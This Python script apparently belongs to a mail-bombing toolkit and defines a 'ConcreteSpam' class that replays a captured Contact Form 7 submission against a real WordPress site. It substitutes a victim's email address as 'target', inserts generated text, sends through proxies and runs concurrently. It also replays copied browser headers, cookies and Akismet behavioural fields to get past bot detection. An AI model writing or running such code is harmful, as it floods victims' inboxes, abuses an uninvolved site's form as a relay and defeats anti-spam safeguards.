from os.path import basename

import requests

from module import Spam

cookies = {
    '_gid': 'GA1.2.1719268122.1676281671',
    '_gat_gtag_UA_179109656_1': '1',
    '_ga_WZK62BL9R4': 'GS1.1.1676281671.1.1.1676281683.0.0.0',
    '_ga': 'GA1.1.1651957636.1676281671',
}

headers = {
    'authority': 'hajimeteyosaiten.com',
    'accept': 'application/json, */*;q=0.1',
    'accept-language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryinvFORfx0DHYWX4E',
    'origin': 'https://hajimeteyosaiten.com',
    'referer': 'https://hajimeteyosaiten.com/contact/',
    'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
}


class ConcreteSpam(Spam):

    def post(self, target) -> requests.Response | None:
        data = '------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7"\r\n\r\n4770\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_version"\r\n\r\n5.7.3\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_locale"\r\n\r\nja\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_unit_tag"\r\n\r\nwpcf7-f4770-p4764-o1\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_container_post"\r\n\r\n4764\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_posted_data_hash"\r\n\r\n65515679a58b3e4cd9cbf7d3fb593c71\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="your-name"\r\n\r\nname\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="your-email"\r\n\r\nwezxasqw@gmail.com\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="your-subject"\r\n\r\ntest\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="your-message"\r\n\r\ntest\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_ak_hp_textarea"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="_wpcf7_ak_js"\r\n\r\n1676281683615\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n1676281685094\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1676281693680\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n23\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n136;145,96;120,24;88,64;56,128;104,16;272,160;56,72;72;72;128,144;144,56;88,8;640,104;96,72;88,64;80;64;24,8;48,48;72;64,64;1,569;\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n63;72,969;71,384;62,1322;71,265;65,761;72,1247;71,528;88,265;143,632;71,97;104,65;72,1272;\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n13\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n0\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n0\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n2\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n0\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n1676281685094\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1676281708239\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n40\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n136;145,96;120,24;88,64;56,128;104,16;272,160;56,72;72;72;128,144;144,56;88,8;640,104;96,72;88,64;80;64;24,8;48,48;72;64,64;1,569;104;160,48;136,80;144,8;184,232;112,344;72,56;144,224;184,80;136,16;104,80;88,80;88,64;13;112;104,72;1,233;\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n63;72,969;71,384;62,1322;71,265;65,761;72,1247;71,528;88,265;143,632;71,97;104,65;72,1272;62,889;55,7217;63,345;71,2361;90,427;55,348;63,225;63,561;56,353;85,1170;\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n23\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n4\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n0\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n2\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n0\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n10045,647;1299,164;2183,72;3233,734;\r\n------WebKitFormBoundaryinvFORfx0DHYWX4E--\r\n'
        data = data.replace('wezxasqw@gmail.com', target).replace('test', self.get_text())

        response = requests.post(
            'https://hajimeteyosaiten.com/wp-json/contact-form-7/v1/contact-forms/4770/feedback',
            cookies=cookies,
            headers=headers,
            data=data.encode(), proxies=self.get_proxies()
        )
        return response


def main():
    s = 'mail_sent'

    spam = ConcreteSpam(basename(__file__)[:-3], s)
    res = spam.send_post()
    if res:
        spam.run_concurrently(1)


if __name__ == '__main__':
    main()
